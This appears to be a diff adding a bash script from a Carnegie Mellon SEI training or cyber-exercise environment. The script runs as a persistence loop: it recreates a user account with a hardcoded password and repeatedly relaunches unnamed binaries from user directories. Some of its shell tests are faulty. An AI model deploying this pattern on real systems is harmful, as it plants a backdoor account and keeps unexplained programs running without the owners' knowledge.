@@ -1,0 +1,42 @@
+#!/bin/bash
+
+# Copyright 2022 Carnegie Mellon University.
+# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
+# root or contact permission@sei.cmu.edu for full terms.
+
+i=0
+while [ $i=0 ]
+do
+	chk=`id -u guy`
+	chk1=`ls /home/ | grep guy | wc -l`
+	chk2=`ps aux | grep guy/Public/c1 | wc -l`
+
+	if [ "${chk:0:2}" == "id" ] && [  "$chk1" < 1 ] #if user guy dosnt exist AND his home directory is gone 
+	then
+		useradd -m -s /bin/bash "guy"
+	        echo -e guy:n1c3Try | sudo chpasswd
+		usermod -a -G guy user
+		gpasswd -d guy sudo
+	fi
+
+	FILE=/home/guy/Public/c1
+	if [ ! -f "$FILE" ]
+	then
+		/home/boy/Downloads/catch
+	fi
+
+	FILE=/home/guy/Public/catch
+	if [ ! -f "$FILE" ]
+	then
+		/home/boy/Downloads/catchDwn
+	fi
+
+	if [[ "$chk2" -lt 1 ]]
+	then
+		/home/guy/Public/c1
+	fi
+
+	chmod -R 700 /home/guy
+	chown -R guy:guy /home/guy
+	sleep 240
+done
